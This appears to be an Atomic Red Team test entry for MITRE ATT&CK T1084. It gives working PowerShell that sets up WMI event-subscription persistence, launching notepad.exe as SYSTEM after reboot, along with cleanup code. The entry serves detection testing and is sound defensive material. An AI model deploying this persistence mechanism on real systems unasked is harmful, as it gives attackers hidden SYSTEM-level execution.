{
  "Windows Management Instrumentation Event Subscription": {
    "MITRE ATT&CK Technique:": "[T1084](https://attack.mitre.org/wiki/Technique/T1084)",
      "Persistence": {
        "Example:": "```\n#Run from an administrator powershell window\n#Code references\n#https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n#https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n\n$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter\nConsumer = [Ref] $Consumer\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n```"
      },
      "After running, reboot the victim machine. After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.": "",
      "Cleanup:": "```powershell
	  #Run from an administrator powershell window
	  #Code references
	  #https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af
	  #https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545

	  $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-Example'\"
	  $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-Example'\"
	  $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\"

	  $FilterConsumerBindingToCleanup | Remove-WmiObject
	  $EventConsumerToCleanup | Remove-WmiObject
	  $EventFilterToCleanup | Remove-WmiObject
	  ```",
        "References": "https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545"
  }
}
